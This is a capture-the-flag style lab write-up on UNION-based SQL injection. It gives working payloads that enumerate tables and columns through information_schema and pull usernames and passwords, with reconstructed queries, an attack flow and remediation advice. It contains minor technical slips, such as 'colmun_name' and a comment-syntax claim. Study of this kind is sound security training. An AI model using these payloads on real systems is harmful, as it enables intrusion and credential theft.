# LAB 05 - Listing the database contents on non-Oracle databases

## Lab Information

- **Category:** SQL Injection
- **Difficulty:** Practitioner
- **Status:** ✅ Solved
- **Date:** 2026-8-1

---

![SQL Injection](https://img.shields.io/badge/SQL-Injection-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

## Objective

The objective of this lab is to exploit a UNION-based SQL Injection vulnerability to enumerate the database structure, extract user credentials, and use the administrator's credentials to successfully authenticate.
---

## Vulnerability Overview

The attack relied on querying the database metadata stored in the information_schema database before extracting sensitive data from the application tables.
---

## Methodology

1. Browse to the vulnerable category page.
2. Intercept the HTTP request using Burp Suite.
3. Identify the vulnerable category parameter.
4. Inject a UNION SELECT payload.
5. Determine the users table name using the table_name column from the information_schema.tables system table.
6. Determine the users column name using the colmun_name column from the information_schema.tables system table.
7. Inject a UNION SELECT payload to retrieve all passwords and usernames from the users table.
---

## Payloads Used

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema ='public'--
```

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name ='users_echoye'--
```

```sql
' UNION SELECT password_gfsbxm,username_ldmcrc FROM users_echoye--
```
(--) is used as the comment character in MySQL.

---

## Why It Worked

The attack first enumerated the database metadata to discover table names, then identified column names, and finally extracted sensitive data from the discovered table.

---

## Impact

An attacker can access information within the database, such as usernames, passwords, and other data.

---

## Root Cause

The application directly concatenated user-controlled input into the SQL query without using parameterized statements, allowing attackers to inject arbitrary SQL commands.

---

## Remediation

- **Prepared Statements**
  - Prevent SQL queries from being modified by user input.

- **Input Validation**
  - Reject unexpected input.

- **Least Privilege**
  - Reduce the impact if SQL Injection occurs.

---

## Lessons Learned

- Database enumeration should always precede data extraction.
- Metadata stored in information_schema provides valuable information about database objects.
- Sensitive tables and columns can be identified without guessing their names.
- UNION-based SQL Injection can lead to complete database disclosure.

---

## SQL Query Analysis

The application likely executed the following SQL query:

```sql
SELECT name,description
FROM products
WHERE category='Gifts';

```

After SQL injection:

```sql
SELECT name,description
FROM products
WHERE category=''
UNION
SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--


```

```sql
SELECT name,description
FROM products
WHERE category=''
UNION
SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_echoye'--


```

```sql
SELECT name,description
FROM products
WHERE category=''
UNION
SELECT password_gfsbxm,username_ldmcrc FROM users_echoye--


```


---

## Database Specific Notes

- Database: Non-Oracle (information_schema)
- Users table name: users_echoye
- Password and username column names : password_gfsbxm,username_ldmcrc
- Comment Syntax Used: --
  
---

## Key Takeaways

- UNION SELECT requires matching columns.
- The information_schema database stores metadata about tables, columns, and other database objects.
- Database fingerprinting helps identify DBMS-specific attack techniques.

---

## Attack Flow

1. Identify SQL Injection.
2. Determine the number of columns.
3. Verify UNION compatibility.
4. Enumerate database tables.
5. Enumerate table columns.
6. Extract sensitive data.
7. Use the extracted credentials.

---

## Screenshots

### Before Exploitation

![Before](screenshots/before-lab5.png)

### Burp Request

![Burp Request](screenshots/burp-request-lab5.png)

![Burp Request](screenshots/burp-request-lab5(2).png)

![Burp Request](screenshots/burp-request-lab5(3).png)


### Result

![Result](screenshots/success-lab5.png)
